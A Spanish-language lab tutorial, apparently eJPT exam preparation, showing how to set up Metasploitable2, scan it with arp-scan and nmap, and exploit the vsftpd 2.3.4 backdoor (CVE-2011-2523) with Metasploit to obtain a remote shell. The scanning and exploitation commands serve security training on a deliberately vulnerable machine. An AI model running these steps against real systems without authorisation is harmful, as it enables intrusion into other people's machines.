
----
- TAG:  #Introducción #Metasploit #vsftpd #Linux
----
# Explotación de Vulnerabilidades con vsFTPd

En esta ocasión, vamos a cambiar la vulnerabilidad pero prácticamente será de la misma manera que lo hicimos con **EternalBlue**. Durante el examen, el tipo de ataque que nos pueda tocar es un misterio, así que es importante estar preparados.

## Descargar y Configurar Metasploitable2

Lo primero que haremos es descargarnos otra máquina vulnerable para practicar con **vsftpd**. Utilizaremos la famosa máquina [Metasploitable2](https://sourceforge.net/projects/metasploitable/files/Metasploitable2). Descarguen la última versión y se les descargará un archivo comprimido.

1. Extraemos el archivo.
2. Abrimos nuestro virtualizador (VirtualBox o VMware).
3. Damos en **Nueva**.
4. Le asignamos el nombre pero no cargamos ningún archivo todavía.
5. Ponemos el tipo de sistema operativo en **Linux**.
6. Damos a siguiente.
7. En **Disco duro virtual**, seleccionamos la opción de **Usar un archivo de disco duro virtual existente** y cargamos el archivo de **Metasploitable2**. Seleccionamos y continuamos con la instalación.
8. Antes de encender la máquina, no olviden ir a **Configuración** y seleccionar la opción de red en **Adaptador Puente**, ya que es muy importante para la conexión inalámbrica entre nuestras máquinas.
9. Si les carga el inicio de un login, se ha instalado correctamente. El usuario es trabajo nuestro conseguirlo 😉

## Identificar la Máquina Metasploitable2

Desde nuestra máquina atacante, podemos realizar un **arp-scan**:

```bash
arp-scan -I wlan0 --localnet
```

Para poder encontrar la nueva máquina **Metasploitable2**. Una vez identificada, le podemos realizar un `ping`:

```bash
ping -c 1 1.2.3.4
```

En este output, encontraremos que el **ttl** muestra otro número diferente, ya que nos estamos enfrentando a una máquina **Linux**.

## Escaneo con Nmap

Si realizamos un escaneo con **nmap**, veremos que tiene muchos puertos abiertos con varias vulnerabilidades. Es hora de aprender a cómo vulnerarlas, ya que nos permite practicar con varias vulnerabilidades:

```bash
nmap -p- --open -sS -sV --min-rate 5000 -n -vvv -Pn 1.2.3.4 -oN escaneo
```

Empezaremos escaneando el puerto `21` para encontrar vulnerabilidades utilizando **nmap**:

```bash
nmap --script "vuln" -p21 1.2.3.4
```

Perfecto, ahora nos muestra que es vulnerable y nos indica el **CVE-2011-2523**.

## Utilizar Metasploit para Explotar vsFTPd

Abrimos nuestro **msfconsole** (Metasploit) y buscamos con la función **search**. Si no nos muestra resultados, intenten de otra manera:

```bash
search vsFTPd 2.3.4
```

De esta manera sí encontrará información, ya que en Metasploit algunos datos no se encuentran con los CVE sino con el nombre de la vulnerabilidad.

## Seleccionar y Configurar el Exploit

Seleccionamos el exploit:

```msfconsole
msf6 > use 0 
```

Una vez seleccionado el exploit, vemos las opciones:

```msfconsole
msf6 > show options
```

Aquí veremos otros tipos de opciones, pero será casi lo mismo. Asignamos la dirección IP de nuestra máquina víctima:

```msfconsole
msf6 > set RHOSTS 1.2.3.4
```

En **RPORT** por lo general suele estar asignado en el puerto **21**, ya que este servicio **vsFTPd** corre por este puerto. Revisamos que esté asignado correctamente con un `show options`.

## Ejecutar el Exploit

Si está todo bien, ponemos a correr el exploit:

```bash
msf6 > run 
```

Lo que pasa a continuación es algo aleatorio, ya que recibimos la reverse shell por un puerto aleatorio, procedente de la máquina víctima.

Una vez dentro, podemos enviar una `shell` para obtener una consola interactiva:

```msfconsole
shell
```

Esto es algo que debemos dominar muy bien, ya que es algo que nos tocará hacer muy seguido en la eJPT.

